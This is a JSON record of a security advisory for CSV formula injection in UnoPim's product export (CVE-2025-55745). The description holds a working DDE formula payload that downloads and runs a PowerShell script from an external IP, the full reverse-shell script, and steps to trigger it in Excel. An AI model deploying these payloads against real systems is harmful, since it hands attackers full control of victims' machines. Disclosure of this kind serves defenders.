{
  "Severity": "LOW",
  "UpdatedAt": "2025-08-22T16:50:06Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "unopim/unopim"
  },
  "Advisory": {
    "DatabaseId": 308601,
    "Id": "GSA_kwCzR0hTQS03NHJnLTZmOTItZzZ3eM4ABLV5",
    "GhsaId": "GHSA-74rg-6f92-g6wx",
    "References": [
      {
        "Url": "https://github.com/unopim/unopim/security/advisories/GHSA-74rg-6f92-g6wx"
      },
      {
        "Url": "https://github.com/unopim/unopim/commit/8325b78567411ad78d44c0385f192360e608ff71"
      },
      {
        "Url": "https://github.com/unopim/unopim/commit/b25db9496fc147842a519d1dd42ec03c3bf00a34"
      },
      {
        "Url": "https://drive.proton.me/urls/3TP1QEMXNC#2PAy7OkVqdP3"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-55745"
      },
      {
        "Url": "https://github.com/advisories/GHSA-74rg-6f92-g6wx"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-74rg-6f92-g6wx"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-55745"
      }
    ],
    "Description": "### Summary\nDescription:\n`CSV Injection` or `Formula Injection` is a security vulnerability that occurs when malicious content is inserted into a CSV (Comma-Separated Values) file, which is then opened in a spreadsheet application like Microsoft Excel. This attack exploits the way spreadsheet software automatically interprets certain text patterns as formulas or commands, rather than plain text.\n\n### Details\nA basic test for CSV Injection is using `SUM()` to add two numbers or open calc.exe​ using​\ncommand:\n `=cmd|' /C calc'!A0​`\n\n\nThe same method can be used to run arbitrary code on the victim's machine.\nFor example the below code will download and execute a malicious script to create a reverse TCP connection to the attacker's machine.\n*Payload*:\n\u003e This is our payload and will be used in the vulnerable field during exploitation\n```\n    =cmd|' /C powershell Invoke-WebRequest\n    \"http://52.172.182.242:7000/shell.ps1\" -OutFile \"$env:Temp\\shell.ps1\";\n    powershell -ExecutionPolicy Bypass -File \"$env:Temp\\shell.ps1\"'!A1​\n```\n\n*shell.ps1*:\n```\n    $client = New-Object System.Net.Sockets.TCPClient('52.172.182.242',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2\u003e\u00261\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()​\n```\n\n### PoC:\n\n  1. Go to any product and click on Edit\n  2. Add the above discussed payload in any field that accept text for e.g. Product Number field.\n  3. Quick Export -\u003e Select CSV, Open the csv, the formula will get executed during opening.\n\n\u003e This could be injected by admin or any user that has privilege to edit products.\n\u003e Also the CSRF Injection reported at product edit feature can be used as an attack vector to add such payloads.\n\n\nPlease note that if this is replicated on version starting from Office 2021:\nFollow these steps:\nGo to `File \u003e Options \u003e Trust Center \u003e Trust Center Settings \u003e External Content​ -\u003e Enable Dynamic Data Exchange Server Launch\"`.\nThis is due to Office 2021 and Microsoft 365 have DDE disabled by default for enhanced security.\n\nPlatform Details:\nReplicated this on Office 2021 on Windows 11.\nPOC video link: https://drive.proton.me/urls/3TP1QEMXNC#2PAy7OkVqdP3\n\n### Impact\nWhen the victim opens the CSV, the injected formula which fetches a reverse shell script written in Powershell from attacker's server and executes it. This creates a reverse shell connection from victim's device to attacker's allowing an attacker to perform any action on the victim's device.\n\n### Recommendation:\n- Avoid starting values with Equals sign (=), Plus sign (+), Minus sign (-), At symbol (@), Tab (0x09), Carriage return (0x0D).\n- Sanitize the vulnerable field using regex or standard libraries.\n- Wrap the value around double quotes for fields that cannot be sanitized for some reason so that the value is considered as string instead of formula.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-08-22T16:50:05Z",
    "Severity": "LOW",
    "Summary": "UnoPim has CSV Injection on Quick Export feature",
    "UpdatedAt": "2025-08-22T21:09:44Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.3.1"
      },
      "VulnerableVersionRange": "\u003c= 0.3.0"
    }
  ]
}